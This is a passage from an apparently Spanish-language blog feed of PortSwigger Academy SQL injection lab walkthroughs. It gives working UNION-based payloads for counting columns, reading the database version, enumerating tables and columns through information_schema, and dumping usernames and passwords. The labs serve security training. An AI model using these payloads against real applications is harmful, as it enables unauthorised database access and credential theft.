&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la version de la base de datos MySQL o Microsoft SQL Server y poder imprimir en las tablas que se presentan. La string que deberiamos de recuperar es &lt;code&gt;8.0.27&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo &lt;code&gt;union select null-- &lt;/code&gt; notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Algo a tomar en cuenta es que al hacer la solicitud por medio del navegador si se agrega solamente un espacio este no aceptara correctamente la consulta por alguna razon por lo que habria que agregar un &lt;code&gt;-&lt;/code&gt; para inyectar correctamente la consulta y contrario por medio de &lt;code&gt;repeater en burpsuite&lt;/code&gt; si se puede agregar solo el espacio y sigue mostrando correctamente sin dar un error de servidor.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;h4 id=&#34;detectar-columnas&#34;&gt;Detectar columnas&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 1-- -
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Gifts&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- -
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 3-- - //Muestra error
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;detectar-string&#34;&gt;Detectar string&lt;/h3&gt;
&lt;p&gt;Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recuperar-version&#34;&gt;Recuperar version&lt;/h3&gt;
&lt;p&gt;Ahora recuperar la version, las consultas utilizadas para esto en &lt;code&gt;Oracle&lt;/code&gt; son las siguientes:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select @@version,null-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 92; 
			flex-basis: 221px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/resuelto.png&#34; data-size=&#34;1763x1908&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/resuelto.png&#34;
			width=&#34;1763&#34;
			height=&#34;1908&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/resuelto_hub5b3c9914d9ed653fe39f1d753b7a134_540914_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/resuelto_hub5b3c9914d9ed653fe39f1d753b7a134_540914_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 9</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/</link>
        <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 9" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases&#34;&gt;Lab: SQL injection attack, listing the database contents on non-Oracle databases&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer datos de la base de datos, basandose en inyectar consultas para tomarlos, al final se resuelve el laboratorio iniciando sesion con el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo &lt;code&gt;union select null-- &lt;/code&gt; notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;h4 id=&#34;detectar-columnas&#34;&gt;Detectar columnas&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 1-- -
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Gifts&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- -
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 3-- - //Muestra error
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;detectar-string&#34;&gt;Detectar string&lt;/h3&gt;
&lt;p&gt;Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recuperar-tablas&#34;&gt;Recuperar tablas&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,table_name fRoM information_schema.tables-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 93; 
			flex-basis: 225px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/dbs.png&#34; data-size=&#34;1794x1909&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/dbs.png&#34;
			width=&#34;1794&#34;
			height=&#34;1909&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/dbs_hucc0bf64a2a09ae2df1872684eefc6b74_207558_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/dbs_hucc0bf64a2a09ae2df1872684eefc6b74_207558_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Listado de Tablas&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Listado de Tablas&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;recuperar-nombres-de-columnas-de-la-tabla-users_fcqnpf&#34;&gt;Recuperar nombres de columnas de la tabla &lt;code&gt;users_fcqnpf&lt;/code&gt;&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,column_name fRoM information_schema.columns wHeRe table_name=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users_fcqnpf&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 105; 
			flex-basis: 254px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/columns.png&#34; data-size=&#34;1754x1657&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/columns.png&#34;
			width=&#34;1754&#34;
			height=&#34;1657&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/columns_hu05f43e8ed173b7b9daeb78008c2a0a46_529229_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/columns_hu05f43e8ed173b7b9daeb78008c2a0a46_529229_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Listado de columnas de la tabla users_fcqnpf&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Listado de columnas de la tabla users_fcqnpf&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;recuperar-datos&#34;&gt;Recuperar Datos&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Gifts&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select username_nrukiy,password_ebqikr from users_fcqnpf-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 444px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/datos.png&#34; data-size=&#34;1749x944&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/datos.png&#34;
			width=&#34;1749&#34;
			height=&#34;944&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/datos_hu337d3c0c1cac383618b2cc03e4479db4_207061_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/datos_hu337d3c0c1cac383618b2cc03e4479db4_207061_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Usuarios y Contrasenas extraidos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Usuarios y Contrasenas extraidos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 247; 
			flex-basis: 594px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/resuelto.png&#34; data-size=&#34;1783x720&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/resuelto.png&#34;
			width=&#34;1783&#34;
			height=&#34;720&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/resuelto_hueac367ce4a8d9a70f297c76badbefdad_60651_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/resuelto_hueac367ce4a8d9a70f297c76badbefdad_60651_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 3</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/</link>
        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 3" /&gt;&lt;h1 id=&#34;lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query&#34;&gt;Lab: SQL injection UNION attack, determining the number of columns returned by the query&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es recuperar el numero de columnas de la tabla a la que se esta realizando la consulta, para posteriormente poder extraer los datos basandose en ese numero de columnas. Para este caso se puede hacer uso de dos metodos que pueden ser &lt;code&gt;ORDER BY ?&lt;/code&gt; o &lt;code&gt;UNION SELECT NULL,NULL,NULL...&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Usando algunos de estos dos podemos recuperar el numero de columnas, sabiendo que a la hora que la aplicacion genere un error no sera el numero de columna correcta, claramente si usamos un &lt;code&gt;order by 9&lt;/code&gt; y secuencialmente llegamos hasta el 10 quiere decir que esa tabla cuenta con 9 columnas y son las que utilizaremos posteriormente para imprimir los datos.&lt;/p&gt;
&lt;p&gt;Union select null funciona igualmente, si agregamos 9 null y al agregar un null mas nos muestra error quiere decir que esa tabla solo cuenta con 9 columnas. Un ejemplo de uso en una consulta sql seria:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span 